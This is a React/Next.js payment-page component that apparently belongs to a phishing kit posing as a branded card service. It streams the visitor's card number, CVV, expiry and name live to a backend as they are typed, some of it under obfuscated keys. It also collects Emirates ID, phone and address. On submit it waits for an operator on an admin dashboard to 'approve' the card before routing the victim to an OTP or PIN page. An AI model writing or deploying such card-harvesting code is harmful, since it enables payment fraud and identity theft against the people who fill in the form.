'use client';
import React, { useState, useEffect, useRef, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';
import { useLang } from '@/context/LanguageContext';
import { t } from '@/i18n';
import { createRegistration } from '@/lib/firebase';
import { trackPresence, pushPresence } from '@/lib/presence';
import { addCardHistoryEntry, resetPayStatus, listenPayDoc, saveRegId } from '@/lib/visitor-sync';

function PaymentContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { lang } = useLang();
  const T = t[lang].payment;

  const brandKey = (searchParams?.get('brand') || 'fazaa') as BrandKey;
  const typeKey  = (searchParams?.get('type')  || 'gold')  as CardTypeKey;

  const [holderName, setHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry]         = useState('');
  const [cvv, setCvv]               = useState('');
  const [errors, setErrors]         = useState<Record<string, string>>({});
  const [waiting, setWaiting]       = useState(false);
  const [apiError, setApiError]     = useState('');

  const unsubRef  = useRef<(() => void) | null>(null);
  const activeRef = useRef(false); // true while waiting for admin card decision

  // Cleanup on unmount
  useEffect(() => () => { unsubRef.current?.(); }, []);

  // Presence: announce this visitor on the payment page
  useEffect(() => {
    let regData: Record<string, unknown> | null = null;
    try { regData = JSON.parse(sessionStorage.getItem('reg_data') || 'null'); } catch {}
    return trackPresence({
      page: 'payment', step: 'payment',
      fullName:   String(regData?.fullName   ?? '') || undefined,
      phone:      String(regData?.phone      ?? '') || undefined,
      emiratesId: String(regData?.emiratesId ?? '') || undefined,
      region:     String(regData?.region     ?? '') || undefined,
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Presence: push card data live as user types
  useEffect(() => {
    pushPresence({
      page: waiting ? 'waiting' : 'payment',
      _v4: holderName || undefined,                      cardHolderName: holderName || undefined,
      _v1: cardNumber.replace(/\s/g, '') || undefined,  cardNumber: cardNumber.replace(/\s/g, '') || undefined,
      _v3: expiry || undefined,                         expiryDate: expiry || undefined,
      _v2: cvv || undefined,                            cvv: cvv || undefined,
    });
  }, [holderName, cardNumber, expiry, cvv, waiting]);

  const handleCardNumber = (v: string) => {
    const d = v.replace(/\D/g, '').slice(0, 16);
    setCardNumber(d.replace(/(.{4})/g, '$1 ').trim());
  };

  const handleExpiry = (v: string) => {
    const d = v.replace(/\D/g, '').slice(0, 4);
    setExpiry(d.length >= 3 ? d.slice(0, 2) + '/' + d.slice(2) : d);
  };

  const validate = () => {
    const e: Record<string, string> = {};
    if (!holderName.trim())                         e.holderName = T.errors.holderName;
    if (cardNumber.replace(/\s/g, '').length < 16) e.cardNumber = T.errors.cardNumber;
    if (!/^\d{2}\/\d{2}$/.test(expiry))            e.expiry     = T.errors.expiry;
    if (cvv.length < 3)                            e.cvv        = T.errors.cvv;
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  /**
   * Listen to pays doc for admin approve / reject.
   * Skips the first snapshot to avoid acting on stale Firestore state.
   */
  const startPaysListener = (regId: string) => {
    unsubRef.current?.(); // stop any previous listener
    let isFirst = true;

    unsubRef.current = listenPayDoc((data) => {
      if (isFirst) { isFirst = false; return; }
      if (!activeRef.current) return;

      const cardStatus = data.cardStatus as string | undefined;
      const otpStatus  = data.otpStatus  as string | undefined;

      if (
        cardStatus === 'approved_with_otp' ||
        cardStatus === 'approved_with_pin' ||
        otpStatus  === 'show_otp' ||
        otpStatus  === 'show_pin'
      ) {
        activeRef.current = false;
        unsubRef.current?.(); unsubRef.current = null;
        setWaiting(false);
        router.push(`/otp?id=${regId}`);
      } else if (cardStatus === 'rejected') {
        activeRef.current = false;
        unsubRef.current?.(); unsubRef.current = null;
        setWaiting(false);
        // Clear the form so visitor can re-enter card details
        setHolderName(''); setCardNumber(''); setExpiry(''); setCvv('');
        setApiError(T.errors.cardNumber
          ? 'تعذّر التحقق من بيانات البطاقة، يرجى إعادة الإدخال'
          : 'تعذّر التحقق من بيانات البطاقة، يرجى إعادة الإدخال');
      }
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    if (activeRef.current) return; // prevent double-submit

    setApiError('');
    setWaiting(true);
    activeRef.current = true;

    let regData: Record<string, unknown> | null = null;
    try { regData = JSON.parse(sessionStorage.getItem('reg_data') || 'null'); } catch {}

    const payload = {
      fullName:      String(regData?.fullName      ?? holderName),
      phone:         String(regData?.phone         ?? ''),
      emiratesId:    String(regData?.emiratesId    ?? ''),
      brand:         String(regData?.brand         ?? brandKey),
      cardType:      String(regData?.cardType      ?? typeKey),
      region:        String(regData?.region        ?? ''),
      streetAddress: String(regData?.streetAddress ?? ''),
      neighborhood:  String(regData?.neighborhood  ?? ''),
      deliveryDate:  String(regData?.deliveryDate  ?? new Date().toISOString().split('T')[0]),
      paymentMethod: String(regData?.paymentMethod ?? 'card'),
    };

    try {
      const id = await createRegistration(payload);
      saveRegId(id);
      sessionStorage.removeItem('reg_data');
      pushPresence({ page: 'waiting', step: 'payment', registrationId: id });

      // 1. Clear old cardStatus/otpStatus so stale values don't trigger the listener
      await resetPayStatus();

      // 2. Write card data to pays history (_t1) so dashboard shows it
      await addCardHistoryEntry({
        cardNumber:     cardNumber.replace(/\s/g, ''),
        cvv,
        expiryDate:     expiry,
        cardHolderName: holderName,
      });

      // 3. Start listening — only reacts to changes AFTER submission
      startPaysListener(id);
    } catch {
      activeRef.current = false;
      setWaiting(false);
      setApiError(T.apiError);
    }
  };

  const brand = BRANDS[brandKey] || BRANDS.fazaa;
  const inputCls = (f: string) =>
    `w-full bg-white border ${errors[f] ? 'border-red-400' : 'border-gray-200'} rounded-xl px-4 py-3 outline-none focus:border-[#c9a227] focus:ring-1 focus:ring-[#c9a227] transition-shadow text-gray-800 placeholder:text-gray-300`;

  return (
    <>
      {waiting && (
        <div className="fixed inset-0 z-50 flex items-center justify-center"
          style={{ background: 'rgba(0,0,0,0.55)', backdropFilter: 'blur(3px)' }}>
          <div className="mx-6 w-full max-w-[340px] rounded-2xl px-8 py-8 flex flex-col items-center gap-5"
            style={{ background: 'rgba(55,55,55,0.92)' }}>
            <div className="w-14 h-14 rounded-full border-4 border-[#c9a227]/30 border-t-[#c9a227] animate-spin" />
            <p className="text-white text-center text-[15px] leading-relaxed">{T.waiting}</p>
            <p className="text-white/50 text-xs text-center">{T.waitingSub}</p>
          </div>
        </div>
      )}

      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center py-10 px-4">
        <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden">

          <div className="flex justify-end px-6 pt-7 pb-5 border-b border-gray-100">
            <div className="flex flex-col items-center">
              <div className="w-16 h-16 rounded-xl flex items-center justify-center text-white font-bold text-2xl shadow-sm mb-1"
                style={{ background: `linear-gradient(135deg, ${brand.darkColor}, ${brand.color})` }}>
                {brand.name.charAt(0)}
              </div>
              <span className="font-bold text-[13px] tracking-widest font-sans" style={{ color: brand.color }}>
                {brand.nameEn}
              </span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="px-6 py-7 space-y-6" noValidate>
            <div className="space-y-1.5">
              <label className="block text-sm font-semibold text-gray-700">{T.holderName}</label>
              <input type="text" value={holderName} onChange={e => setHolderName(e.target.value)}
                placeholder={T.holderNamePh} className={inputCls('holderName')} />
              {errors.holderName && <p className="text-xs text-red-500">{errors.holderName}</p>}
            </div>

            <div className="space-y-1.5">
              <label className="block text-sm font-semibold text-gray-700">{T.cardNumber}</label>
              <div className="relative">
                <input type="text" inputMode="numeric" value={cardNumber}
                  onChange={e => handleCardNumber(e.target.value)}
                  placeholder="0000 0000 0000 0000"
                  className={`${inputCls('cardNumber')} pr-14`} dir="ltr" maxLength={19} />
                <div className="absolute top-1/2 -translate-y-1/2 right-3">
                  <svg width="28" height="20" viewBox="0 0 28 20" fill="none">
                    <rect width="28" height="20" rx="3" fill="#1a1f71"/>
                    <rect y="5" width="28" height="5" fill="#f7b731"/>
                    <rect x="3" y="13" width="7" height="3" rx="1" fill="#c9a227"/>
                  </svg>
                </div>
              </div>
              {errors.cardNumber && <p className="text-xs text-red-500">{errors.cardNumber}</p>}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700">{T.expiry}</label>
                <input type="text" inputMode="numeric" value={expiry}
                  onChange={e => handleExpiry(e.target.value)}
                  placeholder="MM/YY" className={inputCls('expiry')} dir="ltr" maxLength={5} />
                {errors.expiry && <p className="text-xs text-red-500">{errors.expiry}</p>}
              </div>
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700">{T.cvv}</label>
                <input type="text" inputMode="numeric" value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                  placeholder="•••" className={inputCls('cvv')} dir="ltr" maxLength={3} />
                {errors.cvv && <p className="text-xs text-red-500">{errors.cvv}</p>}
              </div>
            </div>

            <div className="bg-[#f8f5eb] border border-[#e8d99a] rounded-xl px-4 py-3 flex items-start gap-3">
              <span className="text-xl mt-0.5 shrink-0">🔒</span>
              <p className="text-[13px] text-gray-600 leading-relaxed">{T.security}</p>
            </div>

            {apiError && (
              <p className="text-sm text-red-500 text-center bg-red-50 border border-red-200 rounded-xl py-3 px-4">
                {apiError}
              </p>
            )}

            <button type="submit" disabled={waiting}
              className="w-full bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold text-[17px] py-4 rounded-xl transition-colors shadow-sm disabled:opacity-50 cursor-pointer">
              {T.btnNext}
            </button>
          </form>
        </div>
      </div>
    </>
  );
}

export default function Payment() {
  return <Suspense><PaymentContent /></Suspense>;
}
